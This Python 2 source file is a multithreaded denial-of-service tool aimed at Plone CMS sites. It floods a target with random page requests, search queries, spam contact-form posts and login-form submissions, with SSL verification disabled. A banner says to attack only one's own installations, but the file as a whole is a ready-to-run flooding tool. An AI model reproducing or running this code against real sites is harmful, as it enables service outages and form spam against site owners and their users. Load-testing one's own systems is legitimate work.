# -*- coding: utf-8 -*-
# 
# @author: 0_o -- null_null
#          nu11.nu11 [at] yahoo.com
#          Oh, and it is n-u-one-one.n-u-one-one, no l's...
#
# @copyright: 2016 until today, all rights reserved. NO UNAUTHORIZED USE PERMITTED!
# 
# @license: GPLv3.0
# 

import threading
import sys
import argparse
import signal
import requests
import random
import string
import time

if sys.platform.startswith('darwin'):
    # Disable the nasty warnings about SSL cert verification. This is a DoS tool!
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
elif sys.platform.startswith('linux'):
    pass
elif sys.platform.startswith('win'):
    pass
else:
    pass

sw_name = "Plone DoS test tool"
sw_version = "v1.3"
sw_banner = '\nThis is the ' + sw_name + ' ' + sw_version + ' - Availability does matter.\n' \
            'Use it to drown a Plone instance in non-cachable requests.\n' \
            '(C) 2016 until today: 0_o -- null_null (nu11.nu11[at]yahoo.com)\n\n' \
            'WARNING:    ATTACK YOUR OWN PLONE INSTALLATIONS ONLY!!!\n' \
            '            WHEN USING THIS TOOL AGAINST OTHER INSTALLATIONS THAN THOSE\n' \
            '            YOU ARE AUTHORIZED TO ATTACK, YOU MIGHT VIOLATE YOUR LOCAL LAWS!\n\n' \
            'DISCLAIMER: This software is delivered as-is. Use it on your own risk!\n' \
            '            I am _not_ responsible for any damage it might cause and\n' \
            '            I cannot be held liable for it. YOU HAVE BEEN WARNED!\n\n' \
            'License:    This software is licensed under GPLv3.\n' \
            '            You find a copy of the license here:\n' \
            '            http://www.gnu.org/licenses/gpl-3.0.en.html\n'
threadLock = threading.Lock()
threads = []
running = True


class dos_nonexiting(threading.Thread):
    def __init__(self, victim, backoff_factor):
        threading.Thread.__init__(self)
        self.__running = True
        self.__backoff = backoff_factor * random.random() / 100.0
        self.__victim = victim
        self.__randstr = threading.local()
        self.__req = threading.local()
        self.__r = threading.local()
        self.__e = threading.local()
        self.__h = threading.local()
        self.__c = threading.local()
        pass

    def run(self):
        global threadLock
        s = threading.local()
        # Use a backoff sleep time to avoid all threads starting at once
        time.sleep(self.__backoff)
        session = requests.Session()
        while self.__running:
            self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
            self.__req = self.__victim + '/' + self.__randstr
            try:
                self.__r = session.get(self.__req, timeout = 10.0, verify = False)
                self.__e = self.__r.status_code
                self.__h = self.__r.headers
                self.__c = self.__r.content
                if self.__e >= 500: s = "5"
                else: s = "."
                # No need for thread safety here... Hrrhrrhrr :)
                sys.stdout.write(s)
            except (requests.ConnectionError):
                sys.stdout.write("E")
            except (requests.HTTPError):
                sys.stdout.write("H")
            except (requests.Timeout):
                sys.stdout.write("T")
        pass
    
    def stopme(self):
        self.__running = False
        pass
    
    
class dos_search(threading.Thread):
    def __init__(self, victim, backoff_factor):
        threading.Thread.__init__(self)
        self.__running = True
        self.__backoff = backoff_factor * random.random() / 100.0
        self.__victim = victim
        self.__randstr = threading.local()
        self.__req = threading.local()
        self.__r = threading.local()
        self.__e = threading.local()
        self.__h = threading.local()
        self.__c = threading.local()
        pass

    def run(self):
        global threadLock
        s = threading.local()
        # Use a backoff sleep time to avoid all threads starting at once
        time.sleep(self.__backoff)
        session = requests.Session()
        while self.__running:
            self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
            self.__req = self.__victim + '/@@search?SearchableText=' + self.__randstr
            try:
                self.__r = session.get(self.__req, timeout = 10.0, verify = False)
                self.__e = self.__r.status_code
                self.__h = self.__r.headers
                self.__c = self.__r.content
                if self.__e >= 500: s = "5"
                else: s = "."
                # No need for thread safety here... Hrrhrrhrr :)
                sys.stdout.write(s)
            except (requests.ConnectionError):
                sys.stdout.write("E")
            except (requests.HTTPError):
                sys.stdout.write("H")
            except (requests.Timeout):
                sys.stdout.write("T")
        pass
    
    def stopme(self):
        self.__running = False
        pass
    
    
class dos_contact(threading.Thread):
    def __init__(self, victim, backoff_factor):
        threading.Thread.__init__(self)
        self.__running = True
        self.__backoff = backoff_factor * random.random() / 100.0
        self.__victim = victim
        self.__randstr = threading.local()
        self.__req = threading.local()
        self.__data = threading.local()
        self.__headers = threading.local()
        self.__r = threading.local()
        self.__e = threading.local()
        self.__h = threading.local()
        self.__c = threading.local()
        pass

    def run(self):
        global threadLock
        s = threading.local()
        self.__req = self.__victim + '/contact-info'
        self.__headers = {'Referer': self.__req, 
                          'Content-Type': 'multipart/form-data; boundary=---------------------------29713827018367436031035745563'}
        # Use a backoff sleep time to avoid all threads starting at once
        time.sleep(self.__backoff)
        session = requests.Session()
        while self.__running:
            self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
            self.__data = '-----------------------------29713827018367436031035745563\x0d\x0a' \
                          'Content-Disposition: form-data; name=\"form.widgets.sender_fullname\"\x0d\x0a\x0d\x0aspammer ' + self.__randstr + '\x0d\x0a' \
                          '-----------------------------29713827018367436031035745563\x0d\x0a' \
                          'Content-Disposition: form-data; name=\"form.widgets.sender_from_address\"\x0d\x0a\x0d\x0aspam-' + self.__randstr + '@nowhere.org\x0d\x0a' \
                          '-----------------------------29713827018367436031035745563\x0d\x0a' \
                          'Content-Disposition: form-data; name=\"form.widgets.subject\"\x0d\x0a\x0d\x0aspam ' + self.__randstr + '\x0d\x0a' \
                          '-----------------------------29713827018367436031035745563\x0d\x0a' \
                          'Content-Disposition: form-data; name=\"form.widgets.message\"\x0d\x0a\x0d\x0ajust_spam_' + self.__randstr + '\x0d\x0a' \
                          '-----------------------------29713827018367436031035745563\x0d\x0a' \
                          'Content-Disposition: form-data; name=\"form.buttons.send\"\x0d\x0a\x0d\x0aSenden\x0d\x0a' \
                          '-----------------------------29713827018367436031035745563--\x0d\x0a'
            try:
                self.__r = session.post(self.__req, headers=self.__headers, data = self.__data, timeout = 10.0, verify = False)
                self.__e = self.__r.status_code
                self.__h = self.__r.headers
                self.__c = self.__r.content
                if self.__e >= 500: s = "5"
                else: s = "."
                # No need for thread safety here... Hrrhrrhrr :)
                sys.stdout.write(s)
            except (requests.ConnectionError):
                sys.stdout.write("E")
            except (requests.HTTPError):
                sys.stdout.write("H")
            except (requests.Timeout):
                sys.stdout.write("T")
        pass
    
    def stopme(self):
        self.__running = False
        pass


class dos_login(threading.Thread):
    def __init__(self, victim, backoff_factor):
        threading.Thread.__init__(self)
        self.__running = True
        self.__backoff = backoff_factor * random.random() / 100.0
        self.__victim = victim
        self.__randstr = threading.local()
        self.__req = threading.local()
        self.__data = threading.local()
        self.__headers = threading.local()
        self.__r = threading.local()
        self.__e = threading.local()
        self.__h = threading.local()
        self.__c = threading.local()
        pass

    def run(self):
        global threadLock
        s = threading.local()
        self.__req = self.__victim + '/login_form'
        self.__headers = {'Referer': self.__victim + '/login', 
                          'Content-Type': 'application/x-www-form-urlencoded'}
        # Use a backoff sleep time to avoid all threads starting at once
        time.sleep(self.__backoff)
        session = requests.Session()
        while self.__running:
            self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
            self.__data = 'came_from=' + self.__victim + '%2F&next=&ajax_load=&ajax_include_head=&target=&mail_password_url=&' \
                          'join_url=&form.submitted=1&js_enabled=0&cookies_enabled=&' \
                          'login_name=&pwd_empty=0&__ac_name=' + self.__randstr + '&' \
                          '__ac_password=' + self.__randstr + '&submit=Anmelden'
            try:
                self.__r = session.post(self.__req, data = self.__data, timeout = 10.0, verify = False)
                self.__e = self.__r.status_code
                self.__h = self.__r.headers
                self.__c = self.__r.content
                if self.__e >= 500: s = "5"
                else: s = "."
                # No need for thread safety here... Hrrhrrhrr :)
                sys.stdout.write(s)
            except (requests.ConnectionError):
                sys.stdout.write("E")
            except (requests.HTTPError):
                sys.stdout.write("H")
            except (requests.Timeout):
                sys.stdout.write("T")
        pass
    
    def stopme(self):
        self.__running = False
        pass


class dos_login_malformed(threading.Thread):
    def __init__(self, victim, backoff_factor):
        threading.Thread.__init__(self)
        self.__running = True
        self.__backoff = backoff_factor * random.random() / 100.0
        self.__victim = victim
        self.__randstr = threading.local()
        self.__req = threading.local()
        self.__data = threading.local()
        self.__headers = threading.local()
        self.__r = threading.local()
        self.__e = threading.local()
        self.__h = threading.local()
        self.__c = threading.local()
        pass

    def run(self):
        global threadLock
        s = threading.local()
        self.__req = self.__victim + '/login_form'
        self.__headers = {'Referer': self.__victim + '/login', 
                          'Content-Type': 'application/x-www-form-urlencoded'}
        # Use a backoff sleep time to avoid all threads starting at once
        time.sleep(self.__backoff)
        session = requests.Session()
        while self.__running:
            self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
            try:
                self.__data = 'came_from=' + self.__victim + '%2F&next=&ajax_load=&ajax_include_head=&target=&mail_password_url=&' \
                          'join_url=&form.submitted=1&js_enabled=0&cookies_enabled=&' \
                          'login_name=&pwd_empty=0&__ac_name=' + self.__randstr + '&' \
                          '__ac_password=' + self.__randstr + '&submit=Anmelden'
                self.__r = session.get(self.__req + '?' + self.__data, timeout=10.0, verify = False)
                self.__e = self.__r.status_code
                self.__h = self.__r.headers
                self.__c = self.__r.content
                if self.__e >= 500: s = "5"
                else: s = "."
                # No need for thread safety here... Hrrhrrhrr :)
                sys.stdout.write(s)
            except (requests.ConnectionError):
                sys.stdout.write("E")
            except (requests.HTTPError):
                sys.stdout.write("H")
            except (requests.Timeout):
                sys.stdout.write("T")
        pass
    
    def stopme(self):
        self.__running = False
        pass


def stop_all():
    global threads
    for t in threads:
        t.stopme()


def main():
    global threads
    global running
    global sw_banner
    attacks = {0: dos_nonexiting,
               1: dos_search,
               2: dos_contact,
               3: dos_login,
               4: dos_login_malformed}
    attacks.update({len(attacks): None})
    # Make the script killable gracefully by SIGTERM and SIGABRT.
    signal.signal(signal.SIGTERM, stop_all)
    signal.signal(signal.SIGABRT, stop_all)
    random.seed()
    print sw_banner
    argParser = argparse.ArgumentParser(formatter_class = argparse.ArgumentDefaultsHelpFormatter)
    argParser.epilog = "While the program is running, one character will be printed out for each request. " \
                       "E: connection error, " \
                       "T: request timeout, " \
                       "H: invalid HTTP response, " \
                       "5: HTTP status 5xx, " \
                       ".: all other HTTP status codes."
    argParser.add_argument("target", dest = "target", type = str, default = "https://localhost", required = True, 
                           help = "The target to test", metavar = "TARGET")
    argParser.add_argument("-a", "--attack", dest = "attack", type = int, default = 0, required = False, 
                           help = "Different attacks. 0: GET random page, " \
                                                     "1: spam search, " \
                                                     "2: spam contact-info, " \
                                                     "3: spam login_form, " \
                                                     "4: send malformed login_form, " \
                                                     "5: run all attacks at once", 
                           metavar = "ATTACK")
    argParser.add_argument("-n", "--number", dest = "number", type = int, default = 1, required = False, 
                           help = "Start that many threads", metavar = "NUMBER")
    argParser.add_argument("-v", "--version", action = "version", version = "1.0")
    args = argParser.parse_args(sys.argv[1:])
    my_captcha = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(3))
    try:
        print 'Run attack mode ' + str(args.attack) + ' against "' + args.target + '" with ' + str(args.number) + ' threads. Are you sure?\n'
        user_answer = str(raw_input('In order to accept the WARNING, DISCLAIMER and license printed above,\n' \
                                    'please enter the captcha code (' + my_captcha + '): '))
    except (KeyboardInterrupt, SystemExit):
        print "\n\nYou bailed out - Good Bye!\n"
        return
    if user_answer != my_captcha:
        print "\nGot blurry vision? Wrong captcha code!\n"
        return
    print "\nStarting up - hit Ctrl+C to abort (and then be patient)..."
    for _ in range(1, args.number + 1):
        if attacks.get(args.attack) is None:
            # OK, run all attack types at once.
            t = attacks.get(random.randint(0, len(attacks) - 2))(args.target, args.number)
        else:
            # Run one specified type of attack.
            t = attacks.get(args.attack)(args.target, args.number)
        threads.append(t)
        t.start()
    try:
        while running:
            time.sleep(0.1)
            # Keep the console printing dots and numbers
            sys.stdout.flush()
    except (KeyboardInterrupt, SystemExit):
        print "\n\nGot it - mob up and exit. Be patient now...\n"
        running = False
        stop_all()
    finally:
        for t in threads:
            t.join()
            sys.stdout.flush()
        print "\nAll threads stopped.\n"
    pass


if __name__ == '__main__':
    try:
        main()
    except (KeyboardInterrupt):
        print "\n\nBe p-a-t-i-e-n-t !!!   --   But if you cannot await it, another Ctrl+C will exit immediately.\n"
        pass
   
# vim syntax=python ts=4 sw=4 sts=4 sr noet
 
